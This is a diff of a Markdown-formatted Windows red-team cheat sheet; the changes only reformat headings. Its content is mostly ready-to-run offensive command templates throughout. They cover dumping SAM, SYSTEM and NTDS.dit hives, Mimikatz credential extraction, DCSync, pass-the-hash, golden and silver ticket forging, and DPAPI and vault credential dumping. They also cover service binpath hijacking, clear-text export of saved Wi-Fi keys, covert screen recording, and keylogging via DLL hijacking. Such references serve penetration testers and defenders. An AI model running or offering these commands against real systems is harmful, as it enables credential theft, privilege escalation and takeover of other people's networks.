-<span id="anchor-227"></span>WMIC List Processes - Full
+##### <span id="anchor-227"></span>WMIC List Processes - Full
 
 ```
 wmic /node:”**&lt;host&gt;**” process list full
 ```
 
-<span id="anchor-228"></span>WMIC List Processes - Brief
+##### <span id="anchor-228"></span>WMIC List Processes - Brief
 
 ```
 wmic /node:”**&lt;host&gt;**” process list brief
 ```
 
-<span id="anchor-229"></span>WMIC Kill Process by PID
+##### <span id="anchor-229"></span>WMIC Kill Process by PID
 
 ```
 wmic /node:”**&lt;host&gt;**” where (ProcessID = “**&lt;PID&gt;**”) call terminate
 ```
 
-<span id="anchor-230"></span>WMIC Kill Process by Name
+##### <span id="anchor-230"></span>WMIC Kill Process by Name
 
 ```
 wmic /node:”**&lt;host&gt;**” where (Name = “**&lt;PE Name&gt;**”) call terminate
 ```
 
-<span id="anchor-231"></span>Services
+#### <span id="anchor-231"></span>Services
 
-<span id="anchor-232"></span>List Services
+##### <span id="anchor-232"></span>List Services
 
 [*https://technet.microsoft.com/en-us/library/cc990290(v=ws.11).aspx*](https://technet.microsoft.com/en-us/library/cc990290(v=ws.11).aspx)
 
@@ -1723,47 +1715,46 @@ wmic /node:”**&lt;host&gt;**” where (Name = “**&lt;PE Name&gt;**”) call 
 sc query type= service state= all
 ```
 
-<span id="anchor-233"></span>List Services (Old Way)
+##### <span id="anchor-233"></span>List Services (Old Way)
 
 ```
 net start
 ```
 
-<span id="anchor-234"></span>Find Services with Unquoted Paths (wmic)
+##### <span id="anchor-234"></span>Find Services with Unquoted Paths (wmic)
 
 ```
 wmic service get name,displayname,pathname,startmode \|findstr /i "Auto" \|findstr /i /v "C:\\Windows\\\\" \|findstr /i /v """
 ```
 
-<span id="anchor-235"></span>Find Services with Unquoted Paths
-(PowerShell)
+##### <span id="anchor-235"></span>Find Services with Unquoted Paths (PowerShell)
 
 ```
 Get-WmiObject win32\_service \| select name,pathname \| Where-Object -Filter { $\_.pathname -notlike "\`"\*\`"\*" -and $\_.pathname -notlike "C:\\WINDOWS\\\*" -and -$\_.pathname }
 ```
 
-<span id="anchor-236"></span>Enable Service (Admin or User Modifiable
+##### <span id="anchor-236"></span>Enable Service (Admin or User Modifiable
 Service)
 
 ```
 sc config **&lt;service&gt;** start= demand
 ```
 
-<span id="anchor-237"></span>Start Service (Admin or User Modifiable
+##### <span id="anchor-237"></span>Start Service (Admin or User Modifiable
 Service)
 
 ```
 net start **&lt;service&gt;**
 ```
 
-<span id="anchor-238"></span>Stop Service (Admin or User Modifiable
+##### <span id="anchor-238"></span>Stop Service (Admin or User Modifiable
 Service)
 
 ```
 net stop **&lt;service&gt;**
 ```
 
-<span id="anchor-239"></span>Create a Service (Admin, Service PE)
+##### <span id="anchor-239"></span>Create a Service (Admin, Service PE)
 
 ```
 sc \\\\**&lt;host&gt;** create **&lt;name&gt;** binpath= **&lt;program&gt;**
@@ -1773,8 +1764,7 @@ sc \\\\**&lt;host&gt;** create **&lt;name&gt;** binpath= **&lt;program&gt;**
 specified another command. Windows will kill the CMD but leave the
 program it runs active.
 
-<span id="anchor-240"></span>Edit a Writable Service (use accesschk.exe
-to find one)
+##### <span id="anchor-240"></span>Edit a Writable Service (use accesschk.exe to find one)
 
 ```
 # Change the command
@@ -1783,9 +1773,9 @@ sc config <strong>&lt;servicename&gt;</strong> binpath= “<strong>&lt;command a
 sc config <strong>&lt;servicename&gt;</strong> obj= “.\LocalSystem” password= “”</p></td>
 ```
 
-<span id="anchor-241"></span>Scheduled Tasks (Admin)
+#### <span id="anchor-241"></span>Scheduled Tasks (Admin)
 
-<span id="anchor-242"></span>Schedule a Task with AT
+##### <span id="anchor-242"></span>Schedule a Task with AT
 
 ```
 <strong>Check the time with:</strong>
@@ -1794,7 +1784,7 @@ net time \\<strong>&lt;host&gt;</strong>
 at \\<strong>&lt;host&gt; HH:MM &lt;command&gt;</strong></p></td>
 ```
 
-<span id="anchor-243"></span>Schedule a Task with SCHTASKS
+##### <span id="anchor-243"></span>Schedule a Task with SCHTASKS
 
 ```
 <strong>Create the task:</strong>
@@ -1803,193 +1793,191 @@ schtasks /create /tn <strong>&lt;name&gt;</strong> /tr <strong>&lt;program&gt;</
 schtasks /run /tn <strong>&lt;name&gt;</strong> /S <strong>&lt;host&gt;</strong></p></td>
 ```
 
-<span id="anchor-244"></span>Network Discovery
+#### <span id="anchor-244"></span>Network Discovery
 
-<span id="anchor-245"></span>PowerShell - List Connections
+##### <span id="anchor-245"></span>PowerShell - List Connections
 
 ```
 Get-NetTCPConnection
 ```
 
-<span id="anchor-246"></span>List Established Connections
+##### <span id="anchor-246"></span>List Established Connections
 
 ```
 netstat -anp **\[tcp\|udp\]** \| find “ESTAB”
 ```
 
-<span id="anchor-247"></span>List Listening Ports
+##### <span id="anchor-247"></span>List Listening Ports
 
 ```
 netstat -anp **\[tcp\|udp\]** \| find “LISTEN”
 ```
 
-<span id="anchor-248"></span>List Open Ports with PIDs
+##### <span id="anchor-248"></span>List Open Ports with PIDs
 
 ```
 netstat -ano
 ```
 
-<span id="anchor-249"></span>Show IP Addressing Configuration Details
+##### <span id="anchor-249"></span>Show IP Addressing Configuration Details
 
 ```
 netsh interface ip show addresses
 ```
 
-<span id="anchor-250"></span>Show IP Routing Configuration Details
+##### <span id="anchor-250"></span>Show IP Routing Configuration Details
 
 ```
 netsh interface ip show route
 ```
 
-<span id="anchor-251"></span>Show IP Neighbor Details
+##### <span id="anchor-251"></span>Show IP Neighbor Details
 
 ```
 netsh interface ip show neighbors
 ```
 
-<span id="anchor-252"></span>ARP Table List
+##### <span id="anchor-252"></span>ARP Table List
 
 ```
 arp -a
 ```
 
-<span id="anchor-253"></span>Display DNS Cache
+##### <span id="anchor-253"></span>Display DNS Cache
 
 ```
 ipconfig /displaydns
 ```
 
-<span id="anchor-254"></span>Display Ports with Connections and
-Processes
+##### <span id="anchor-254"></span>Display Ports with Connections and Processes
 
 ```
 netstat -nabo
 ```
 
-<span id="anchor-255"></span>Display Routing Table (netstat)
+##### <span id="anchor-255"></span>Display Routing Table (netstat)
 
 ```
 netstat -r
 ```
 
-<span id="anchor-256"></span>Display Routing Table (route)
+##### <span id="anchor-256"></span>Display Routing Table (route)
 
 ```
 route print
 ```
 
-<span id="anchor-257"></span>Find Specific Listening Port
+##### <span id="anchor-257"></span>Find Specific Listening Port
 
 ```
 netstat -na \| findstr :**&lt;port&gt;**
 ```
 
-<span id="anchor-258"></span>Find Listening Ports and PIDs
+##### <span id="anchor-258"></span>Find Listening Ports and PIDs
 
 ```
 netstat -nao \| findstr LISTENING
 ```
 
-<span id="anchor-259"></span>Find Hosts in the Same Workgroup
+##### <span id="anchor-259"></span>Find Hosts in the Same Workgroup
 
 ```
 net view
 ```
 
-<span id="anchor-260"></span>Find Hosts in Another Domain
+##### <span id="anchor-260"></span>Find Hosts in Another Domain
 
 ```
 net view /domain:**&lt;domain&gt;**
 ```
 
-<span id="anchor-261"></span>Find Visible Domains
+##### <span id="anchor-261"></span>Find Visible Domains
 
 ```
 net view /domain
 ```
 
-<span id="anchor-262"></span>Find Domain Controllers
+##### <span id="anchor-262"></span>Find Domain Controllers
 
 ```
 net group “Domain Controllers” /domain
 ```
 
-<span id="anchor-263"></span>Get Domain/Domain Controller Details
+##### <span id="anchor-263"></span>Get Domain/Domain Controller Details
 
 ```
 wmic ntdomain list
 ```
 
-<span id="anchor-264"></span>List HOSTS File Contents
+##### <span id="anchor-264"></span>List HOSTS File Contents
 
 ```
 type %WINDIR%\\System32\\drivers\\etc\\hosts
 ```
 
-<span id="anchor-265"></span>Windows Wireless Networking
+#### <span id="anchor-265"></span>Windows Wireless Networking
 
-<span id="anchor-266"></span>List Saved Wireless Profiles
+##### <span id="anchor-266"></span>List Saved Wireless Profiles
 
 ```
 netsh wlan show profiles
 ```
 
-<span id="anchor-267"></span>Export Saved Wireless Profile
+##### <span id="anchor-267"></span>Export Saved Wireless Profile
 
 ```
 netsh wlan export profile folder=. key=clear
 ```
 
-<span id="anchor-268"></span>Add Specified Wireless Profile
+##### <span id="anchor-268"></span>Add Specified Wireless Profile
 
 ```
 netsh wlan set hostednetwork ssid=**&lt;ssid&gt;** key=**&lt;passphrase&gt;** keyUsage=**\[persistent\|temporary\]**
 ```
 
-<span id="anchor-269"></span>Start or Stop Wireless Network
+##### <span id="anchor-269"></span>Start or Stop Wireless Network
 
 ```
 netsh wlan **\[start\|stop\]** hostednetwork
 ```
 
-<span id="anchor-270"></span>Enable or Disable Wireless Network
+##### <span id="anchor-270"></span>Enable or Disable Wireless Network
 
 ```
 netsh wlan set hostednetwork mode=**\[allow\|disallow\]**
 ```
 
-<span id="anchor-271"></span>Shares
+#### <span id="anchor-271"></span>Shares
 
-<span id="anchor-272"></span>Turn Default Share On
+##### <span id="anchor-272"></span>Turn Default Share On
 
 ```
 net share **&lt;(C$\|ADMIN$)&gt;**
 ```
 
-<span id="anchor-273"></span>Registry Enumeration
+#### <span id="anchor-273"></span>Registry Enumeration
 
-<span id="anchor-274"></span>Locate &lt;string&gt; In Registry (i.e.
-password)
+##### <span id="anchor-274"></span>Locate &lt;string&gt; In Registry (i.e. password)
 
 ```
 reg query **\[HKLM\|HKCU\]** /f **&lt;string&gt;** /t REG\_SZ /s
 ```
 
-<span id="anchor-275"></span>Always Install Elevated Check
+##### <span id="anchor-275"></span>Always Install Elevated Check
 
 ```
 reg query **\[HKLM\|HKCU\]**\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated
 ```
 
-<span id="anchor-276"></span>Crypto Commands
+#### <span id="anchor-276"></span>Encoding/Crypto Commands
 
-<span id="anchor-277"></span>Base64 Encode a File
+##### <span id="anchor-277"></span>Base64 Encode a File
 
 ```
 certutil.exe -encode **&lt;inputfile&gt;** **&lt;outputfile&gt;**
 ```
 
-<span id="anchor-278"></span>Base64 Decode a File
+##### <span id="anchor-278"></span>Base64 Decode a File
 
 ```
 certutil.exe -decode **&lt;inputfile&gt;** **&lt;outputfile&gt;**
@@ -2000,9 +1988,9 @@ certutil.exe -decode **&lt;inputfile&gt;** **&lt;outputfile&gt;**
 fsutil file createnew <file> <size in bytes>
 ```
 
-<span id="anchor-279"></span>Credential Commands
+#### <span id="anchor-279"></span>Credential Commands
 
-<span id="anchor-280"></span>Dumping Registry Hives (System User)
+##### <span id="anchor-280"></span>Dumping Registry Hives (System User)
 
 ```
 reg.exe save hklm\sam c:\temp\sam.save
@@ -2010,15 +1998,14 @@ reg.exe save hklm\security c:\temp\security.save
 reg.exe save hklm\system c:\temp\system.save</td>
 ```
 
-<span id="anchor-281"></span>Dumping Windows Repair SAM & System
-(Windows XP, System User)
+##### <span id="anchor-281"></span>Dumping Windows Repair SAM & System (Windows XP, System User)
 
 ```
 C:\Windows\Repair\SAM
 C:\Windows\Repair\SYSTEM</p></td>
 ```
 
-<span id="anchor-282"></span>Dumping Windows Repair SAM & System
+##### <span id="anchor-282"></span>Dumping Windows Repair SAM & System
 (Windows 7, System User)
 
 ```
@@ -2026,22 +2013,19 @@ C:\windows\system32\config\RegBack\SAM
 C:\windows\system32\config\RegBack\SYSTEM</p></td>
 ```
 
-<span id="anchor-283"></span>Dump Active Directory NTDS.dit with
-NTDSUTIL
+##### <span id="anchor-283"></span>Dump Active Directory NTDS.dit with NTDSUTIL
 
 ```
 ntdsutil “activate instance ntds” “IFM” “create full **&lt;outputfile&gt;**” q q
 ```
 
-<span id="anchor-284"></span>Dump Active Directory NTDS.dit with
-Invoke-NinjaCopy
+##### <span id="anchor-284"></span>Dump Active Directory NTDS.dit with Invoke-NinjaCopy
 
 ```
 Invoke-NinjaCopy -Path “**&lt;path&gt;**\\ntds.dit” -ComputerName “**&lt;DCName&gt;**” -LocalDestination “**&lt;outputfile&gt;**”
 ```
 
-<span id="anchor-285"></span>Dump Active Directory NTDS.dit with Volume
-Shadow Copy
+##### <span id="anchor-285"></span>Dump Active Directory NTDS.dit with Volume Shadow Copy
 
 ```
 wmic /node:<strong>&lt;DC FQDN&gt;</strong> /user:<strong>&lt;domain&gt;</strong>\<strong>&lt;user&gt;</strong> /password:<strong>&lt;password&gt;</strong> process call create “cmd /c vssadmin create shadow /for=<strong>&lt;driveletter</strong>&gt;: 2&gt;&amp;1 &gt; <strong>&lt;logfile&gt;</strong>
@@ -2049,111 +2033,104 @@ wmic /node:<strong>&lt;DC FQDN&gt;</strong> /user:<strong>&lt;domain&gt;</strong
 wmic /node:<strong>&lt;DC FQDN&gt;</strong> /user:<strong>&lt;domain&gt;</strong>\<strong>&lt;user&gt;</strong> /password:<strong>&lt;password&gt;</strong> process call create “cmd /c copy \?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM <strong>&lt;destination_path&gt;</strong> 2&gt;&amp;1 &gt; <strong>&lt;logfile&gt;</strong></p></td>
 ```
 
-<span id="anchor-286"></span>Invoke-MimiKatz Retrieve All Credentials
+##### <span id="anchor-286"></span>Invoke-MimiKatz Retrieve All Credentials
 
 ```
 Invoke-Mimikatz -ComputerName **&lt;host&gt;**
 ```
 
-<span id="anchor-287"></span>Invoke-MimiKatz Retrieve Credentials for a
-Single User from a DC
+##### <span id="anchor-287"></span>Invoke-MimiKatz Retrieve Credentials for a Single User from a DC
 
 ```
 Invoke-Mimikatz -Command “lsadump::dcsync /domain:**&lt;domain FQDN&gt;** /user:**&lt;domain&gt;**\\**&lt;user&gt;**”
 ```
 
-<span id="anchor-288"></span>Invoke-MimiKatz Pass-the-Hash (PTH)
+##### <span id="anchor-288"></span>Invoke-MimiKatz Pass-the-Hash (PTH)
 
 ```
 Invoke-Mimikatz -Command “sekurlsa::pth /user:**&lt;user&gt;** /domain:**&lt;domain&gt;** /ntlm:**&lt;hash&gt;** /run:**&lt;program&gt;**”
 ```
 
-<span id="anchor-289"></span>MimiKatz Get Logon Passwords (From Memory)
+##### <span id="anchor-289"></span>MimiKatz Get Logon Passwords (From Memory)
 
 ```
 privilege::debug
 sekurlsa::logonpasswords</p></td>
 ```
 
-<span id="anchor-290"></span>MimiKatz Dump Tickets (From Memory)
+##### <span id="anchor-290"></span>MimiKatz Dump Tickets (From Memory)
 
 ```
 privilege::debug
 sekurlsa::tickets /export</p></td>
 ```
 
-<span id="anchor-291"></span>MimiKatz Pass-the-Hash (PTH)
+##### <span id="anchor-291"></span>MimiKatz Pass-the-Hash (PTH)
 
 ```
 privilege::debug
 sekurlsa::pth /user:<strong>&lt;user&gt;</strong> /domain:<strong>&lt;domain FQDN&gt;</strong> /ntlm:<strong>&lt;hash&gt;</strong> /run:<strong>&lt;cmd&gt;</strong></p></td>
 ```
 
-<span id="anchor-292"></span>MimiKatz Pass-the-Ticket (PTT) - Generate
-Golden Ticket
+##### <span id="anchor-292"></span>MimiKatz Pass-the-Ticket (PTT) - Generate Golden Ticket
 
 ```
 privilege::debug
 kerberos::golden /user:<strong>&lt;user&gt;</strong> /domain:<strong>&lt;domain FQDN&gt;</strong> /sid:<strong>&lt;SID&gt;</strong> /krbtgt:<strong>&lt;hash&gt;</strong> /ticket:<strong>&lt;filename&gt;</strong></p></td>
 ```
 
-<span id="anchor-293"></span>MimiKatz Pass-the-Ticket (PTT) - Inject
-Golden Ticket
+##### <span id="anchor-293"></span>MimiKatz Pass-the-Ticket (PTT) - Inject Golden Ticket
 
 ```
 privilege::debug
 kerberos::golden /user:<strong>&lt;user&gt;</strong> /domain:<strong>&lt;domain FQDN&gt;</strong> /sid:<strong>&lt;SID&gt;</strong> /krbtgt:<strong>&lt;hash&gt;</strong> /ptt</p></td>
 ```
 
-<span id="anchor-294"></span>MimiKatz Pass-the-Ticket (PTT) - Generate &
-Pass Silver Ticket
+##### <span id="anchor-294"></span>MimiKatz Pass-the-Ticket (PTT) - Generate & Pass Silver Ticket
 
 ```
 privilege::debug
 kerberos::silver /user:<strong>&lt;user&gt;</strong> /domain:<strong>&lt;domain FQDN&gt;</strong> /sid:<strong>&lt;SID&gt;</strong> /krbtgt:<strong>&lt;hash&gt;</strong> /target:<strong>&lt;target FQDN&gt;</strong> /service:<strong>&lt;servicename&gt;</strong> /ptt</p></td>
 ```
 
-<span id="anchor-295"></span>MimiKatz Pass-the-Ticket (PTT) - Passing a
-Ticket (Current Session)
+##### <span id="anchor-295"></span>MimiKatz Pass-the-Ticket (PTT) - Passing a Ticket (Current Session)
 
 ```
 privilege::debug
 Kerberos::ptt <strong>&lt;ticketfile&gt;</strong></p></td>
 ```
 
-<span id="anchor-296"></span>MimiKatz Elivate to SYSTEM (Must be
-Administrator)
+##### <span id="anchor-296"></span>MimiKatz Elivate to SYSTEM (Must be Administrator)
 
 ```
 token::elevate
 ```
 
-<span id="anchor-297"></span>MimiKatz Dump SAM (Live, Requires SYSTEM)
+##### <span id="anchor-297"></span>MimiKatz Dump SAM (Live, Requires SYSTEM)
 
 ```
 lsadump::sam
 ```
 
-<span id="anchor-298"></span>MimiKatz Dump SAM (From Backup)
+##### <span id="anchor-298"></span>MimiKatz Dump SAM (From Backup)
 
 ```
 lsadump::sam **&lt;systemfile&gt;** **&lt;samfile&gt;**
 ```
 
-<span id="anchor-299"></span>MimiKatz Dump Specific User Hash (LSA)
+##### <span id="anchor-299"></span>MimiKatz Dump Specific User Hash (LSA)
 
 ```
 lsadump::lsa /inject /name:**&lt;user&gt;**
 ```
 
-<span id="anchor-300"></span>MimiKatz Dump Specific User Hash (DC
-Synchronization)
+##### <span id="anchor-300"></span>MimiKatz Dump Specific User Hash (DC Synchronization)
 
 ```
 lsadump::dcsync /domain:**&lt;domain FQDN**&gt; /user:**&lt;username&gt;**
 ```
 
-<span id="anchor-301"></span>MimiKatz Dump Service Password
+##### <span id="anchor-301"></span>MimiKatz Dump Service Password
 
 ```
 privilege::debug
@@ -2161,7 +2138,7 @@ token::elevate
 vault::cred /patch</p></td>
 ```
 
-<span id="anchor-302"></span>MimiKatz Dump DPAPI Creds
+##### <span id="anchor-302"></span>MimiKatz Dump DPAPI Creds
 
 ```
 privilege::debug
@@ -2169,8 +2146,7 @@ token::elevate
 dpapi::cred /in:%systemroot%\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\<strong>&lt;credentialfile&gt;</strong></p></td>
 ```
 
-<span id="anchor-303"></span>RUNAS to Create Token & Run Process
-(Password Known)
+##### <span id="anchor-303"></span>RUNAS to Create Token & Run Process (Password Known)
 
 ```
 runas /netonly /user:**&lt;domain&gt;**\\**&lt;user&gt;** **&lt;command&gt;**
@@ -2181,23 +2157,21 @@ as on the local system. Remote systems will see the token you generated.
 This is how Pass-the-Hash (PTH)works. This technique can be used to
 build the hash needed for a PTH.
 
-<span id="anchor-304"></span>Keylogging & Desktop Monitoring
+#### <span id="anchor-304"></span>Keylogging & Desktop Monitoring
 
-<span id="anchor-305"></span>Start Recording Screens with Problem Step
-Recorder (Must be run with user’s credentials)
+##### <span id="anchor-305"></span>Start Recording Screens with Problem Step Recorder (Must be run with user’s credentials)
 
 ```
 psr.exe /start /gui 0 /output **&lt;ZIP file path&gt;**
 ```
 
-<span id="anchor-306"></span>Stop Recording Screens with Problem Step
-Recorder
+##### <span id="anchor-306"></span>Stop Recording Screens with Problem Step Recorder
 
 ```
 psr.exe /IT /RU **&lt;domain&gt;**\\**&lt;user&gt;** /RP **&lt;password&gt;**
 ```
 
-<span id="anchor-307"></span>Keylogging with DLL Hijacking
+##### <span id="anchor-307"></span>Keylogging with DLL Hijacking
 
 Compile a Keylogger as a DLL and place it in the following directory,
 then kill and **explorer.exe**:
